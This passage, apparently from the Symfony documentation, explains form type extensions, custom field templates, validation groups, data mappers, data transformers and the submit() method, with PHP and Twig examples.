                https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/twig
                https://symfony.com/schema/dic/twig/twig-1.0.xsd">

            <twig:config>
                <twig:form-theme>...</twig:form-theme>
                <twig:form-theme>form/custom_types.html.twig</twig:form-theme>
            </twig:config>
        </container>

    .. code-block:: php

        // config/packages/twig.php
        use Symfony\Config\TwigConfig;

        return static function (TwigConfig $twig): void {
            $twig->formThemes([
                '...',
                'form/custom_types.html.twig',
            ]);
        };

The last step is to create the actual Twig template that will render the type.
The template contents depend on which HTML, CSS and JavaScript frameworks and
libraries are used in your application:

.. code-block:: html+twig

    {# templates/form/custom_types.html.twig #}
    {% block postal_address_row %}
        {% for child in form.children|filter(child => not child.rendered) %}
            <div class="form-group">
                {{ form_label(child) }}
                {{ form_widget(child) }}
                {{ form_help(child) }}
                {{ form_errors(child) }}
            </div>
        {% endfor %}
    {% endblock %}

The first part of the Twig block name (e.g. ``postal_address``) comes from the
class name (``PostalAddressType`` -> ``postal_address``). This can be controlled
by overriding the ``getBlockPrefix()`` method in ``PostalAddressType``. The
second part of the Twig block name (e.g. ``_row``) defines which form type part
is being rendered (row, widget, help, errors, etc.)

The article about form themes explains the
:ref:`form fragment naming rules <form-fragment-naming>` in detail. These
are some examples of Twig block names for the postal address type:

.. raw:: html

    <object data="../_images/form/form-custom-type-postal-address-fragment-names.svg" type="image/svg+xml"
        alt="The wireframe with some block names highlighted, these are also listed below the image."
    ></object>

``postal_address_row``
    The full form type block.
``postal_address_addressLine1_help``
    The help message block below the first address line.
``postal_address_state_widget``
    The text input widget for the State field.
``postal_address_zipCode_label``
    The label block of the ZIP Code field.

.. caution::

    When the name of your form class matches any of the built-in field types,
    your form might not be rendered correctly. A form type named
    ``App\Form\PasswordType`` will have the same block name as the built-in
    ``PasswordType`` and won't be rendered correctly. Override the
    ``getBlockPrefix()`` method to return a unique block prefix (e.g.
    ``app_password``) to avoid collisions.

Passing Variables to the Form Type Template
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Symfony passes a series of variables to the template used to render the form
type. You can also pass your own variables, which can be based on the options
defined by the form or be completely independent::

    // src/Form/Type/PostalAddressType.php
    namespace App\Form\Type;

    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\Form\FormInterface;
    use Symfony\Component\Form\FormView;
    // ...

    class PostalAddressType extends AbstractType
    {
        public function __construct(
            private EntityManagerInterface $entityManager,
        ) {
        }

        // ...

        public function buildView(FormView $view, FormInterface $form, array $options): void
        {
            // pass the form type option directly to the template
            $view->vars['isExtendedAddress'] = $options['is_extended_address'];

            // make a database query to find possible notifications related to postal addresses (e.g. to
            // display dynamic messages such as 'Delivery to XX and YY states will be added next week!')
            $view->vars['notification'] = $this->entityManager->find('...');
        }
    }

If you're using the :ref:`default services.yaml configuration <service-container-services-load-example>`,
this example will already work! Otherwise, :ref:`create a service <service-container-creating-service>`
for this form class and :doc:`tag it </service_container/tags>` with ``form.type``.

The variables added in ``buildView()`` are available in the form type template
as any other regular Twig variable:

.. code-block:: html+twig

    {# templates/form/custom_types.html.twig #}
    {% block postal_address_row %}
        {# ... #}

        {% if isExtendedAddress %}
            {# ... #}
        {% endif %}

        {% if notification is not empty %}
            <div class="alert alert-primary" role="alert">
                {{ notification }}
            </div>
        {% endif %}
    {% endblock %}
How to Create a Form Type Extension
===================================

Form type extensions are *incredibly* powerful: they allow you to *modify* any
existing form field types across the entire system.

They have 2 main use-cases:

#. You want to add a **specific feature to a single form type** (such
   as adding a "download" feature to the ``FileType`` field type);
#. You want to add a **generic feature to several types** (such as
   adding a "help" text to every "input text"-like type).

Imagine that you have a ``Media`` entity, and that each media is associated
to a file. Your ``Media`` form uses a file type, but when editing the entity,
you would like to see its image automatically rendered next to the file
input.

Defining the Form Type Extension
--------------------------------

First, create the form type extension class extending from
:class:`Symfony\\Component\\Form\\AbstractTypeExtension` (you can implement
:class:`Symfony\\Component\\Form\\FormTypeExtensionInterface` instead if you prefer)::

    // src/Form/Extension/ImageTypeExtension.php
    namespace App\Form\Extension;

    use Symfony\Component\Form\AbstractTypeExtension;
    use Symfony\Component\Form\Extension\Core\Type\FileType;

    class ImageTypeExtension extends AbstractTypeExtension
    {
        /**
         * Returns an array of extended types.
         */
        public static function getExtendedTypes(): iterable
        {
            // return [FormType::class] to modify (nearly) every field in the system
            return [FileType::class];
        }
    }

The only method you **must** implement is ``getExtendedTypes()``, which is used
to configure *which* field types you want to modify.

Depending on your use case, you may need to override some of the following methods:

* ``buildForm()``
* ``buildView()``
* ``configureOptions()``
* ``finishView()``

For more information on what those methods do, see the
:ref:`custom form field type <form-type-methods-explanation>` article.

Registering your Form Type Extension as a Service
-------------------------------------------------

Form type extensions must be :ref:`registered as services <service-container-creating-service>`
and :doc:`tagged </service_container/tags>` with the ``form.type_extension`` tag.
If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
this is already done for you, thanks to :ref:`autoconfiguration <services-autoconfigure>`.

.. tip::

    There is an optional tag attribute called ``priority``, which defaults to
    ``0`` and controls the order in which the form type extensions are loaded
    (the higher the priority, the earlier an extension is loaded). This is
    useful when you need to guarantee that one extension is loaded before or
    after another extension. Using this attribute requires you to add the
    service configuration explicitly.

Once the extension is registered, any method that you've overridden (e.g.
``buildForm()``) will be called whenever *any* field of the given type
(``FileType``) is built.

.. tip::

    Run the following command to verify that the form type extension was
    successfully registered in the application:

    .. code-block:: terminal

        $ php bin/console debug:form

Adding the extension Business Logic
-----------------------------------

The goal of your extension is to display a nice image next to file input
(when the underlying model contains images). For that purpose, suppose that
you use an approach similar to the one described in
:doc:`How to handle File Uploads with Doctrine </controller/upload_file>`:
you have a Media model with a path property, corresponding to the image path in
the database::

    // src/Entity/Media.php
    namespace App\Entity;

    use Symfony\Component\Validator\Constraints as Assert;

    class Media
    {
        // ...

        /**
         * @var string The path - typically stored in the database
         */
        private string $path;

        // ...

        public function getWebPath(): string
        {
            // ... $webPath being the full image URL, to be used in templates

            return $webPath;
        }
    }

Your form type extension class will need to do two things in order to extend
the ``FileType::class`` form type:

#. Override the ``configureOptions()`` method so that any ``FileType`` field can
   have an  ``image_property`` option;
#. Override the ``buildView()`` methods to pass the image URL to the view.

For example::

    // src/Form/Extension/ImageTypeExtension.php
    namespace App\Form\Extension;

    use Symfony\Component\Form\AbstractTypeExtension;
    use Symfony\Component\Form\Extension\Core\Type\FileType;
    use Symfony\Component\Form\FormInterface;
    use Symfony\Component\Form\FormView;
    use Symfony\Component\OptionsResolver\OptionsResolver;
    use Symfony\Component\PropertyAccess\PropertyAccess;

    class ImageTypeExtension extends AbstractTypeExtension
    {
        public static function getExtendedTypes(): iterable
        {
            // return [FormType::class] to modify (nearly) every field in the system
            return [FileType::class];
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            // makes it legal for FileType fields to have an image_property option
            $resolver->setDefined(['image_property']);
        }

        public function buildView(FormView $view, FormInterface $form, array $options): void
        {
            if (isset($options['image_property'])) {
                // this will be whatever class/entity is bound to your form (e.g. Media)
                $parentData = $form->getParent()->getData();

                $imageUrl = null;
                if (null !== $parentData) {
                    $accessor = PropertyAccess::createPropertyAccessor();
                    $imageUrl = $accessor->getValue($parentData, $options['image_property']);
                }

                // sets an "image_url" variable that will be available when rendering this field
                $view->vars['image_url'] = $imageUrl;
            }
        }

    }

Override the File Widget Template Fragment
------------------------------------------

Each field type is rendered by a template fragment. Those template fragments
can be overridden in order to customize form rendering. For more information,
you can refer to the :ref:`form fragment naming <form-fragment-naming>` rules.

In your extension class, you added a new variable (``image_url``), but
you still need to take advantage of this new variable in your templates.
Specifically, you need to override the ``file_widget`` block:

.. code-block:: html+twig

    {# templates/form/fields.html.twig #}
    {% extends 'form_div_layout.html.twig' %}

    {% block file_widget %}
        {{ block('form_widget') }}
        {% if image_url is defined and image_url is not null %}
            <img src="{{ asset(image_url) }}"/>
        {% endif %}
    {% endblock %}

Be sure to :ref:`configure this form theme template <forms-theming-global>` so that
the form system sees it.

Using the Form Type Extension
-----------------------------

From now on, when adding a field of type ``FileType::class`` to your form, you can
specify an ``image_property`` option that will be used to display an image
next to the file field. For example::

    // src/Form/Type/MediaType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\FileType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;

    class MediaType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('name', TextType::class)
                ->add('file', FileType::class, ['image_property' => 'webPath']);
        }
    }

When displaying the form, if the underlying model has already been associated
with an image, you will see it displayed next to the file input.

Generic Form Type Extensions
----------------------------

You can modify several form types at once by specifying their common parent
(:doc:`/reference/forms/types`). For example, several form types inherit from the
``TextType`` form type (such as ``EmailType``, ``SearchType``, ``UrlType``, etc.).
A form type extension applying to ``TextType`` (i.e. whose ``getExtendedType()``
method returns ``TextType::class``) would apply to all of these form types.

In the same way, since **most** form types natively available in Symfony inherit
from the ``FormType`` form type, a form type extension applying to ``FormType``
would apply to all of these (notable exceptions are the ``ButtonType`` form
types). Also keep in mind that if you created (or are using) a *custom* form type,
it's possible that it does *not* extend ``FormType``, and so your form type extension
may not be applied to it.

Another option is to return multiple form types in the ``getExtendedTypes()``
method to extend all of them::

    // src/Form/Extension/DateTimeExtension.php
    namespace App\Form\Extension;
    // ...
    use Symfony\Component\Form\Extension\Core\Type\DateTimeType;
    use Symfony\Component\Form\Extension\Core\Type\DateType;
    use Symfony\Component\Form\Extension\Core\Type\TimeType;

    class DateTimeExtension extends AbstractTypeExtension
    {
        // ...

        public static function getExtendedTypes(): iterable
        {
            return [DateTimeType::class, DateType::class, TimeType::class];
        }
    }
How to Choose Validation Groups Based on the Submitted Data
===========================================================

If you need some advanced logic to determine the validation groups (e.g.
based on submitted data), you can set the ``validation_groups`` option
to an array callback::

    use App\Entity\Client;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    // ...
    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            'validation_groups' => [
                Client::class,
                'determineValidationGroups',
            ],
        ]);
    }

This will call the static method ``determineValidationGroups()`` on the
``Client`` class after the form is submitted, but before validation is
invoked. The Form object is passed as an argument to that method (see next
example).  You can also define whole logic inline by using a ``Closure``::

    use App\Entity\Client;
    use Symfony\Component\Form\FormInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    // ...
    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            'validation_groups' => function (FormInterface $form): array {
                $data = $form->getData();

                if (Client::TYPE_PERSON == $data->getType()) {
                    return ['person'];
                }

                return ['company'];
            },
        ]);
    }

Using the ``validation_groups`` option overrides the default validation
group which is being used. If you want to validate the default constraints
of the entity as well you have to adjust the option as follows::

    use App\Entity\Client;
    use Symfony\Component\Form\FormInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    // ...
    public function configureOptions(OptionsResolver $resolver): void
    {
        $resolver->setDefaults([
            'validation_groups' => function (FormInterface $form): array {
                $data = $form->getData();

                if (Client::TYPE_PERSON == $data->getType()) {
                    return ['Default', 'person'];
                }

                return ['Default', 'company'];
            },
        ]);
    }

You can find more information about how the validation groups and the default constraints
work in the article about :doc:`validation groups </validation/groups>`.
When and How to Use Data Mappers
================================

When a form is compound, the initial data needs to be passed to children so each can display their
own input value. On submission, children values need to be written back into the form.

Data mappers are responsible for reading and writing data from and into parent forms.

The main built-in data mapper uses the :doc:`PropertyAccess component </components/property_access>`
and will fit most cases. However, you can create your own implementation that
could, for example, pass submitted data to immutable objects via their constructor.

The Difference between Data Transformers and Mappers
----------------------------------------------------

It is important to know the difference between
:doc:`data transformers </form/data_transformers>` and mappers.

* **Data transformers** change the representation of a single value, e.g. from
  ``"2016-08-12"`` to a ``DateTime`` instance;
* **Data mappers** map data (e.g. an object or array) to one or many form fields, and vice versa,
  e.g. using a single ``DateTime`` instance to populate the inner fields (e.g year, hour, etc.)
  of a compound date type.

Creating a Data Mapper
----------------------

Suppose that you want to save a set of colors to the database. For this, you're
using an immutable color object::

    // src/Painting/Color.php
    namespace App\Painting;

    final class Color
    {
        public function __construct(
            private int $red,
            private int $green,
            private int $blue,
        ) {
        }

        public function getRed(): int
        {
            return $this->red;
        }

        public function getGreen(): int
        {
            return $this->green;
        }

        public function getBlue(): int
        {
            return $this->blue;
        }
    }

The form type should be allowed to edit a color. But because you've decided to
make the ``Color`` object immutable, a new color object has to be created each time
one of the values is changed.

.. tip::

    If you're using a mutable object with constructor arguments, instead of
    using a data mapper, you should configure the ``empty_data`` option with a closure
    as described in
    :ref:`How to Configure empty Data for a Form Class <forms-empty-data-closure>`.

The red, green and blue form fields have to be mapped to the constructor
arguments and the ``Color`` instance has to be mapped to red, green and blue
form fields. Recognize a familiar pattern? It's time for a data mapper. The
easiest way to create one is by implementing :class:`Symfony\\Component\\Form\\DataMapperInterface`
in your form type::

    // src/Form/ColorType.php
    namespace App\Form;

    use App\Painting\Color;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\DataMapperInterface;
    use Symfony\Component\Form\Exception\UnexpectedTypeException;
    use Symfony\Component\Form\FormInterface;

    final class ColorType extends AbstractType implements DataMapperInterface
    {
        // ...

        /**
         * @param Color|null $viewData
         */
        public function mapDataToForms($viewData, \Traversable $forms): void
        {
            // there is no data yet, so nothing to prepopulate
            if (null === $viewData) {
                return;
            }

            // invalid data type
            if (!$viewData instanceof Color) {
                throw new UnexpectedTypeException($viewData, Color::class);
            }

            /** @var FormInterface[] $forms */
            $forms = iterator_to_array($forms);

            // initialize form field values
            $forms['red']->setData($viewData->getRed());
            $forms['green']->setData($viewData->getGreen());
            $forms['blue']->setData($viewData->getBlue());
        }

        public function mapFormsToData(\Traversable $forms, &$viewData): void
        {
            /** @var FormInterface[] $forms */
            $forms = iterator_to_array($forms);

            // as data is passed by reference, overriding it will change it in
            // the form object as well
            // beware of type inconsistency, see caution below
            $viewData = new Color(
                $forms['red']->getData(),
                $forms['green']->getData(),
                $forms['blue']->getData()
            );
        }
    }

.. caution::

    The data passed to the mapper is *not yet validated*. This means that your
    objects should allow being created in an invalid state in order to produce
    user-friendly errors in the form.

Using the Mapper
----------------

After creating the data mapper, you need to configure the form to use it. This is
achieved using the :method:`Symfony\\Component\\Form\\FormConfigBuilderInterface::setDataMapper`
method::

    // src/Form/Type/ColorType.php
    namespace App\Form\Type;

    // ...
    use Symfony\Component\Form\Extension\Core\Type\IntegerType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    final class ColorType extends AbstractType implements DataMapperInterface
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('red', IntegerType::class, [
                    // enforce the strictness of the type to ensure the constructor
                    // of the Color class doesn't break
                    'empty_data' => '0',
                ])
                ->add('green', IntegerType::class, [
                    'empty_data' => '0',
                ])
                ->add('blue', IntegerType::class, [
                    'empty_data' => '0',
                ])
                // configure the data mapper for this FormType
                ->setDataMapper($this)
            ;
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            // when creating a new color, the initial data should be null
            $resolver->setDefault('empty_data', null);
        }

        // ...
    }

Cool! When using the ``ColorType`` form, the custom data mapper methods will
create a new ``Color`` object now.

Mapping Form Fields Using Callbacks
-----------------------------------

Conveniently, you can also map data from and into a form field by using the
``getter`` and ``setter`` options. For example, suppose you have a form with some
fields and only one of them needs to be mapped in some special way or you only
need to change how it's written into the underlying object. In that case, register
a PHP callable that is able to write or read to/from that specific object::

    public function buildForm(FormBuilderInterface $builder, array $options): void
    {
        // ...

        $builder->add('state', ChoiceType::class, [
            'choices' => [
                'active' => true,
                'paused' => false,
            ],
            'getter' => function (Task $task, FormInterface $form): bool {
                return !$task->isCancelled() && !$task->isPaused();
            },
            'setter' => function (Task &$task, bool $state, FormInterface $form): void {
                if ($state) {
                    $task->activate();
                } else {
                    $task->pause();
                }
            },
        ]);
    }

If available, these options have priority over the property path accessor and
the default data mapper will still use the :doc:`PropertyAccess component </components/property_access>`
for the other form fields.

.. caution::

    When a form has the ``inherit_data`` option set to ``true``, it does not use the data mapper and
    lets its parent map inner values.
How to Use Data Transformers
============================

Data transformers are used to translate the data for a field into a format that can
be displayed in a form (and back on submit). They're already used internally for
many field types. For example, the :doc:`DateType </reference/forms/types/date>` field
can be rendered as a ``yyyy-MM-dd``-formatted input text box. Internally, a data transformer
converts the ``DateTime`` value of the field to a ``yyyy-MM-dd`` formatted string
when rendering the form, and then back to a ``DateTime`` object on submit.

.. caution::

    When a form field has the ``inherit_data`` option set to ``true``, data transformers
    are not applied to that field.

.. seealso::

    If, instead of transforming the representation of a value, you need to map
    values to a form field and back, you should use a data mapper. Check out
    :doc:`/form/data_mappers`.

.. _simple-example-sanitizing-html-on-user-input:

Example #1: Transforming Strings Form Data Tags from User Input to an Array
---------------------------------------------------------------------------

Suppose you have a Task form with a tags ``text`` type::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use App\Entity\Task;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    // ...
    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('tags', TextType::class);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Task::class,
            ]);
        }

        // ...
    }

Internally the ``tags`` are stored as an array, but displayed to the user as a
plain comma separated string to make them easier to edit.

This is a *perfect* time to attach a custom data transformer to the ``tags``
field. The easiest way to do this is with the :class:`Symfony\\Component\\Form\\CallbackTransformer`
class::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use Symfony\Component\Form\CallbackTransformer;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    // ...

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->add('tags', TextType::class);

            $builder->get('tags')
                ->addModelTransformer(new CallbackTransformer(
                    function ($tagsAsArray): string {
                        // transform the array to a string
                        return implode(', ', $tagsAsArray);
                    },
                    function ($tagsAsString): array {
                        // transform the string back to an array
                        return explode(', ', $tagsAsString);
                    }
                ))
            ;
        }

        // ...
    }

The ``CallbackTransformer`` takes two callback functions as arguments. The
first transforms the original value into a format that'll be used to render the
field. The second does the reverse: it transforms the submitted value back into
the format you'll use in your code.

.. tip::

    The ``addModelTransformer()`` method accepts *any* object that implements
    :class:`Symfony\\Component\\Form\\DataTransformerInterface` - so you can create
    your own classes, instead of putting all the logic in the form (see the next section).

You can also add the transformer, right when adding the field by changing the format
slightly::

    use Symfony\Component\Form\Extension\Core\Type\TextType;

    $builder->add(
        $builder
            ->create('tags', TextType::class)
            ->addModelTransformer(/* ... */)
    );

Example #2: Transforming an Issue Number into an Issue Entity
-------------------------------------------------------------

Say you have a many-to-one relation from the Task entity to an Issue entity (i.e. each
Task has an optional foreign key to its related Issue). Adding a list box with all
possible issues could eventually get *really* long and take a long time to load.
Instead, you decide you want to add a text box, where the user can enter the
issue number.

Start by setting up the text field like normal::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use App\Entity\Task;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;

    // ...
    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('description', TextareaType::class)
                ->add('issue', TextType::class)
            ;
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'data_class' => Task::class,
            ]);
        }

        // ...
    }

Good start! But if you stopped here and submitted the form, the Task's ``issue``
property would be a string (e.g. "55"). How can you transform this into an ``Issue``
entity on submit?

Creating the Transformer
~~~~~~~~~~~~~~~~~~~~~~~~

You could use the ``CallbackTransformer`` like earlier. But since this is a bit more
complex, creating a new transformer class will keep the ``TaskType`` form class simpler.

Create an ``IssueToNumberTransformer`` class: it will be responsible for converting
to and from the issue number and the ``Issue`` object::

    // src/Form/DataTransformer/IssueToNumberTransformer.php
    namespace App\Form\DataTransformer;

    use App\Entity\Issue;
    use Doctrine\ORM\EntityManagerInterface;
    use Symfony\Component\Form\DataTransformerInterface;
    use Symfony\Component\Form\Exception\TransformationFailedException;

    class IssueToNumberTransformer implements DataTransformerInterface
    {
        public function __construct(
            private EntityManagerInterface $entityManager,
        ) {
        }

        /**
         * Transforms an object (issue) to a string (number).
         *
         * @param  Issue|null $issue
         */
        public function transform($issue): string
        {
            if (null === $issue) {
                return '';
            }

            return $issue->getId();
        }

        /**
         * Transforms a string (number) to an object (issue).
         *
         * @param  string $issueNumber
         * @throws TransformationFailedException if object (issue) is not found.
         */
        public function reverseTransform($issueNumber): ?Issue
        {
            // no issue number? It's optional, so that's ok
            if (!$issueNumber) {
                return null;
            }

            $issue = $this->entityManager
                ->getRepository(Issue::class)
                // query for the issue with this id
                ->find($issueNumber)
            ;

            if (null === $issue) {
                // causes a validation error
                // this message is not shown to the user
                // see the invalid_message option
                throw new TransformationFailedException(sprintf(
                    'An issue with number "%s" does not exist!',
                    $issueNumber
                ));
            }

            return $issue;
        }
    }

Like the first example, the transformer has two directions. The ``transform()``
method is responsible for converting the data used in your code to a format that
can be rendered in your form (e.g. an ``Issue`` object to its ``id``, a string).
The ``reverseTransform()`` method does the reverse: it converts the submitted value
back into the format you want (e.g. convert the ``id`` back to the ``Issue`` object).

To cause a validation error, throw a :class:`Symfony\\Component\\Form\\Exception\\TransformationFailedException`.
But the message you pass to this exception won't be shown to the user. You'll set
that message with the ``invalid_message`` option (see below).

.. note::

    When ``null`` is passed to the ``transform()`` method, your transformer
    should return an equivalent value of the type it is transforming to (e.g.
    an empty string, 0 for integers or 0.0 for floats).

Using the Transformer
~~~~~~~~~~~~~~~~~~~~~

Next, you need to use the ``IssueToNumberTransformer`` object inside of ``TaskType``
and add it to the ``issue`` field. No problem! Add a ``__construct()`` method
and type-hint the new class::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use App\Form\DataTransformer\IssueToNumberTransformer;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;

    // ...
    class TaskType extends AbstractType
    {
        public function __construct(
            private IssueToNumberTransformer $transformer,
        ) {
        }

        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('description', TextareaType::class)
                ->add('issue', TextType::class, [
                    // validation message if the data transformer fails
                    'invalid_message' => 'That is not a valid issue number',
                ]);

            // ...

            $builder->get('issue')
                ->addModelTransformer($this->transformer);
        }

        // ...
    }

Whenever the transformer throws an exception, the ``invalid_message`` is shown
to the user. Instead of showing the same message every time, you can set the
end-user error message in the data transformer using the
``setInvalidMessage()`` method. It also allows you to include user values::

    // src/Form/DataTransformer/IssueToNumberTransformer.php
    namespace App\Form\DataTransformer;

    use Symfony\Component\Form\DataTransformerInterface;
    use Symfony\Component\Form\Exception\TransformationFailedException;

    class IssueToNumberTransformer implements DataTransformerInterface
    {
        // ...

        public function reverseTransform($issueNumber): ?Issue
        {
            // ...

            if (null === $issue) {
                $privateErrorMessage = sprintf('An issue with number "%s" does not exist!', $issueNumber);
                $publicErrorMessage = 'The given "{{ value }}" value is not a valid issue number.';

                $failure = new TransformationFailedException($privateErrorMessage);
                $failure->setInvalidMessage($publicErrorMessage, [
                    '{{ value }}' => $issueNumber,
                ]);

                throw $failure;
            }

            return $issue;
        }
    }

That's it! If you're using the
:ref:`default services.yaml configuration <service-container-services-load-example>`,
Symfony will automatically know to pass your ``TaskType`` an instance of the
``IssueToNumberTransformer`` thanks to :ref:`autowire <services-autowire>` and
:ref:`autoconfigure <services-autoconfigure>`.
Otherwise, :ref:`register the form class as a service <service-container-creating-service>`
and :doc:`tag it </service_container/tags>` with the ``form.type`` tag.

Now, you can use your ``TaskType``::

    // e.g. somewhere in a controller
    $form = $this->createForm(TaskType::class, $task);

    // ...

Cool, you're done! Your user will be able to enter an issue number into the
text field, which will be transformed back into an Issue object. This means
that, after a successful submission, the Form component will pass a real
``Issue`` object to ``Task::setIssue()`` instead of the issue number.

If the issue isn't found, a form error will be created for that field and
its error message can be controlled with the ``invalid_message`` field option.

.. caution::

    Be careful when adding your transformers. For example, the following is **wrong**,
    as the transformer would be applied to the entire form, instead of just this
    field::

        // THIS IS WRONG - TRANSFORMER WILL BE APPLIED TO THE ENTIRE FORM
        // see above example for correct code
        $builder->add('issue', TextType::class)
            ->addModelTransformer($transformer);

.. _using-transformers-in-a-custom-field-type:

Creating a Reusable issue_selector Field
----------------------------------------

In the above example, you applied the transformer to a normal ``text`` field. But
if you do this transformation a lot, it might be better to
:doc:`create a custom field type </form/create_custom_field_type>`.
that does this automatically.

First, create the custom field type class::

    // src/Form/IssueSelectorType.php
    namespace App\Form;

    use App\Form\DataTransformer\IssueToNumberTransformer;
    use Symfony\Component\Form\AbstractType;
    use Symfony\Component\Form\Extension\Core\Type\TextType;
    use Symfony\Component\Form\FormBuilderInterface;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    class IssueSelectorType extends AbstractType
    {
        public function __construct(
            private IssueToNumberTransformer $transformer,
        ) {
        }

        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder->addModelTransformer($this->transformer);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefaults([
                'invalid_message' => 'The selected issue does not exist',
            ]);
        }

        public function getParent(): string
        {
            return TextType::class;
        }
    }

Great! This will act and render like a text field (``getParent()``), but will automatically
have the data transformer *and* a nice default value for the ``invalid_message`` option.

As long as you're using :ref:`autowire <services-autowire>` and
:ref:`autoconfigure <services-autoconfigure>`, you can start using the form immediately::

    // src/Form/Type/TaskType.php
    namespace App\Form\Type;

    use App\Form\DataTransformer\IssueToNumberTransformer;
    use Symfony\Component\Form\Extension\Core\Type\TextareaType;
    // ...

    class TaskType extends AbstractType
    {
        public function buildForm(FormBuilderInterface $builder, array $options): void
        {
            $builder
                ->add('description', TextareaType::class)
                ->add('issue', IssueSelectorType::class)
            ;
        }

        // ...
    }

.. tip::

    If you're not using ``autowire`` and ``autoconfigure``, see
    :doc:`/form/create_custom_field_type` for how to configure your new ``IssueSelectorType``.

.. _model-and-view-transformers:

About Model and View Transformers
---------------------------------

In the above example, the transformer was used as a "model" transformer.
In fact, there are two different types of transformers and three different
types of underlying data.

.. raw:: html

    <object data="../_images/form/data-transformer-types.svg" type="image/svg+xml"
        alt="Flow diagram with the Model transformer between Model and Norm data, and the View transformer between Norm and View data. This is described in detail below the diagram."
    ></object>

In any form, the three different types of data are:

#. **Model data** - This is the data in the format used in your application
   (e.g. an ``Issue`` object). If you call ``Form::getData()`` or ``Form::setData()``,
   you're dealing with the "model" data.

#. **Norm Data** - This is a normalized version of your data and is commonly
   the same as your "model" data (though not in our example). It's not commonly
   used directly.

#. **View Data** - This is the format that's used to fill in the form fields
   themselves. It's also the format in which the user will submit the data. When
   you call ``Form::submit($data)``, the ``$data`` is in the "view" data format.

The two different types of transformers help convert to and from each of these
types of data:

**Model transformers**:
    - ``transform()``: "model data" => "norm data"
    - ``reverseTransform()``: "norm data" => "model data"

**View transformers**:
    - ``transform()``: "norm data" => "view data"
    - ``reverseTransform()``: "view data" => "norm data"

Which transformer you need depends on your situation.

To use the view transformer, call ``addViewTransformer()``.

.. caution::

    Be careful with model transformers and
    :doc:`Collection </reference/forms/types/collection>` field types.
    Collection's children are created early at ``PRE_SET_DATA`` by its
    ``ResizeFormListener`` and their data is populated later from the normalized
    data. So your model transformer cannot reduce the number of items within the
    Collection (i.e. filtering out some items), as in that case the collection
    ends up with some empty children.

    A possible workaround for that limitation could be not using the underlying
    object directly, but a DTO (Data Transfer Object) instead, that implements
    the transformation of such incompatible data structures.

So why Use the Model Transformer?
---------------------------------

In this example, the field is a ``text`` field, and a text field is always
expected to be a simple, scalar format in the "norm" and "view" formats. For
this reason, the most appropriate transformer was the "model" transformer
(which converts to/from the *norm* format - string issue number - to the *model*
format - Issue object).

The difference between the transformers is subtle and you should always think
about what the "norm" data for a field should really be. For example, the
"norm" data for a ``text`` field is a string, but is a ``DateTime`` object
for a ``date`` field.

.. tip::

    As a general rule, the normalized data should contain as much information as possible.
How to Use the submit() Function to Handle Form Submissions
===========================================================

The recommended way of :ref:`processing Symfony forms <processing-forms>` is to
use the :method:`Symfony\\Component\\Form\\FormInterface::handleRequest` method
to detect when the form has been submitted. However, you can also use the
:method:`Symfony\\Component\\Form\\FormInterface::submit` method to have better
control over when exactly your form is submitted and what data is passed to it::

    use Symfony\Component\HttpFoundation\Request;
    use Symfony\Component\HttpFoundation\Response;
    // ...

    public function new(Request $request): Response
    {
        $task = new Task();
        $form = $this->createForm(TaskType::class, $task);

        if ($request->isMethod('POST')) {
            $form->submit($request->getPayload()->get($form->getName()));

            if ($form->isSubmitted() && $form->isValid()) {
                // perform some action...

                return $this->redirectToRoute('task_success');
            }
        }

        return $this->render('task/new.html.twig', [
            'form' => $form,
        ]);
    }

The list of fields submitted with the ``submit()`` method must be the same as
the fields defined by the form class. Otherwise, you'll see a form validation error::

    public function new(Request $request): Response
    {
        // ...

        if ($request->isMethod('POST')) {
            // '$json' represents payload data sent by React/Angular/Vue
            // the merge of parameters is needed to submit all form fields
            $form->submit(array_merge($json, $request->getPayload()->all()));

            // ...
        }

        // ...
    }

.. tip::

    Forms consisting of nested fields expect an array in
    :method:`Symfony\\Component\\Form\\FormInterface::submit`. You can also submit
